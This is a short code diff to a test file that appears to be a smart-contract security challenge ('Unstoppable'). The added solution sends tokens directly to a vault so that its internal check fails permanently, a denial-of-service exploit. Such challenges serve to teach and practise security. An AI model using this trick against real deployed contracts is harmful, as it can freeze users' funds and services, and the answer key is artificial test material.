@@ -45,6 +45,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // lets transfer some amount directly to vault and make the if logic fail forever
+        await token.connect(player).transfer(vault.address, 10);
     });
 
     after(async function () {
